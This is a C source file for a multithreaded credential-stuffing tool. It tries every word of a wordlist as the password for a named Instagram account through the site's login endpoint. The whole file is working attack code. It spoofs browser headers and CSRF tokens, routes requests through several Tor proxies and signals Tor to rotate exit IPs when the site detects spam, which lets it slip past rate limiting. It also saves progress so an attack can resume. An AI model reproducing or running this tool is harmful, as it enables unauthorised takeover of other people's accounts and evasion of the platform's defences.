#include "main.h"
#include <curl/curl.h>
#include <signal.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#define MAX_BUFF 1024
#define HEADER_SIZE 46

static pthread_mutex_t LISTLOCK = PTHREAD_MUTEX_INITIALIZER;
static list_t* GLOBAL_LIST = NULL;
static volatile sig_atomic_t EXIT = 0;
static size_t LINE = 0;
static char* ACC_NAME;

static size_t data_callback(void *data, size_t size, size_t nmemb, void *userp)
 {
   size_t realsize = size * nmemb;
   callback_t *back = (callback_t *)userp;
   memset((*back).response, '0', RESP_SIZE);
   memcpy((*back).response, data, realsize);
   (*back).response[realsize] = '\0';
   (*back).size = realsize;
   return realsize;
 }

void sigint(int trap){
    write(1,"\nSafe Exit From Threads\nSaving Status...\n",41);
    EXIT = trap;
}

void* istance(void* input){
    short retry = 1;
    input_t* in = (input_t*)input;
    CURLcode response;
    callback_t chunk;
    short auth;
    struct curl_slist *HEADERS = NULL;
    struct curl_slist *COPY = NULL;
    short status = 0;
    //unsigned int seed_r = (unsigned int)tor_port;
    //long port = (long)tor_port;
    unsigned int seed_r = (unsigned int)in->port;
    long port = (long)in->port;
    char header_request[HEADER_SIZE];
    char post_request[MAX_BUFF];
    random_t rands;
    char* word = NULL;
    CURL* req = curl_easy_init();
    assert(req);
    char proxy[26];
    snprintf(proxy,26,"socks5h://127.0.0.1:%ld",port);
    curl_easy_setopt(req, CURLOPT_URL, "https://www.instagram.com/accounts/login/ajax/");
    curl_easy_setopt(req, CURLOPT_PROXY, proxy);
    curl_easy_setopt(req, CURLOPT_ACCEPT_ENCODING, NULL);
    curl_easy_setopt(req, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5_HOSTNAME);
    HEADERS = curl_slist_append(HEADERS, "Content-Type: application/x-www-form-urlencoded");
    HEADERS = curl_slist_append(HEADERS, "Accept: */*");
    HEADERS = curl_slist_append(HEADERS, "Accept-Encoding: gzip, deflate, br");
    HEADERS = curl_slist_append(HEADERS, "Host: www.instagram.com");
    HEADERS = curl_slist_append(HEADERS, "Origin: https://www.instagram.com");
    HEADERS = curl_slist_append(HEADERS, "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Safari/605.1.15");
    HEADERS = curl_slist_append(HEADERS, "Referer: https://www.instagram.com/accounts/login/");
    HEADERS = curl_slist_append(HEADERS, "Connection: keep-alive");
    HEADERS = curl_slist_append(HEADERS, "X-Requested-With: XMLHttpRequest");
    HEADERS = curl_slist_append(HEADERS, "X-IG-WWW-Claim: 0");
    HEADERS = curl_slist_append(HEADERS, "X-CSRFToken: 6823746193");
    curl_easy_setopt(req, CURLOPT_WRITEFUNCTION, data_callback);
    curl_easy_setopt(req, CURLOPT_WRITEDATA, (void *)&chunk);
    for(;;){
    if (EXIT != 0){
        return NULL;
    }
    pthread_mutex_unlock(&TRAP);
    COPY = HEADERS;
    HEADERS = HEADERS->next;
    free(COPY);
    memset(header_request,'0',HEADER_SIZE);
    memset(post_request,'0',MAX_BUFF);
    rand_gen(&rands,&seed_r);
    snprintf(header_request,sizeof(header_request),"X-CSRFToken: %s",rands.token);
    pthread_mutex_lock(&LISTLOCK);
    if (retry == 1){
        word = pop(&GLOBAL_LIST);
        LINE--;
    }
    printf("Trying word %s\n",word);
    if (word == NULL || LINE < 0){
            pthread_mutex_unlock(&LISTLOCK);
            return NULL;
    }
    snprintf(post_request,sizeof(post_request),"username=%s&enc_password=%s23PWD_INSTAGRAM_BROWSER%s0%s%s%s%s&queryParams=%s&optIntoOneTap=false",ACC_NAME,"%","%3A","%3A",rands.number,"%3A",word,"%7B%7D");
    printf("THREAD_ID %lu, WORD %s, NUM = %s, TOK = %s, TOR_PORT = %lu\nHEADER = %s\nPOST = %s\n",(size_t)pthread_self(),word,rands.number,rands.token,port,header_request,post_request);
    pthread_mutex_unlock(&LISTLOCK);
    HEADERS = curl_slist_append(HEADERS, header_request);
    curl_easy_setopt(req, CURLOPT_HTTPHEADER, HEADERS);
    curl_easy_setopt(req, CURLOPT_POST, 1L);
    curl_easy_setopt(req, CURLOPT_POSTFIELDS, post_request);
    curl_easy_setopt(req, CURLOPT_POSTFIELDSIZE, (long)strlen(post_request));
    response = curl_easy_perform(req);
    if (response != CURLE_OK){
        return NULL;
    }
    //curl_slist_free_all(req);
    auth = ast(chunk.response);
    if (auth == AUTH_TRUE){
        EXIT = -1;
        LINE = -1;
        break;
    }
    if (auth == AUTH_FALSE){
        free(word);
        retry = 1;
    }
    if (auth == AUTH_SPAM){
        retry = 0;
        kill(in->tor,SIGHUP);
        sleep(2);
        //kill -HUP tor <pid>
    }
    printf("%s\n",chunk.response);
    //free(word);
    }
    //free
    return NULL;
}

int main(int argc, char** argv){
    char* exec_name = argv[0];
    if (argc < 3){
        printf("Missing Parameters\n");
        help(exec_name);
        exit(EXIT_FAILURE);
    }
    int errno_save = errno;
    errno = 0;
    const size_t NUM_THREADS = atoll(argv[3]);
    if (errno != 0){
        printf("Wrong thread number\n");
        help(exec_name);
        exit(EXIT_FAILURE);
    }
    ACC_NAME = argv[1];
    errno = errno_save;
    int state_fd;
    size_t state_len = strlen(argv[1])+strlen(argv[2])+8;
    char state_file[state_len];
    snprintf(state_file,sizeof(state_file),"%s%s_state",argv[1],argv[2]);
    char* word_buff = NULL;
    size_t word_size = 0;
    if (stat(state_file,NULL) == -1){
        SYSM1("CREATE_STATE_FILE",state_fd,open(state_file,O_CREAT|O_TRUNC|O_RDWR));
    }
    else{
        SYSM1("OPEN_STATE_FILE",state_fd,open(state_file,O_RDWR));
        CHECKEQUAL("READ_STATE_VARIABLE",sizeof(LINE),read(state_fd,&LINE,sizeof(LINE)));
    }
    FILE* wl;
    wl = fopen(argv[2],"r");
    assert(wl);
    sigset_t set;
    sigfillset(&set);
    pthread_sigmask(SIG_SETMASK,&set,NULL);
    struct sigaction handler;
    memset(&handler,'0',sizeof(handler));
    handler.sa_handler = sigint;
    sigaction(SIGINT,&handler,NULL);
    sigemptyset(&set);
    pthread_sigmask(SIG_SETMASK,&set,NULL);
    while(getline(&word_buff,&word_size,wl) > 0){
        insert(&GLOBAL_LIST,word_buff);
        LINE++;
    }
    fclose(wl);
    visit(GLOBAL_LIST);
    assert(NUM_THREADS);
    pid_t tor[NUM_THREADS];
    spawn_proxy(tor, NUM_THREADS);
    pthread_t THREADS[NUM_THREADS];
    long port = INITIAL_PORT;
    sleep(15);
    for (size_t i = 0; i < NUM_THREADS; i++){
        input_t* gen_thread = malloc(sizeof(input_t));
        gen_thread->port = port;
        gen_thread->tor = tor[i];
        pthread_create(&THREADS[i],NULL,istance,(void*)gen_thread);
        port++;
    }
    for (size_t i = 0; i < NUM_THREADS; i++){
        pthread_join(THREADS[i],NULL);
        printf("Joined thread = %lu\n",i);
    }
    if (EXIT != 0){
        CHECKEQUAL("WRITE_STATE_VARIABLE",sizeof(LINE),write(state_fd,&LINE,sizeof(LINE)));
    }
    else{
        SYSNM1("UNLIKING_STATE_FILE",unlink(state_file));
    }
    SYSNM1("CLOSE_STATE_FILE",close(state_fd));
    //waitpid(tor[0],NULL,0);
    return 0;
}
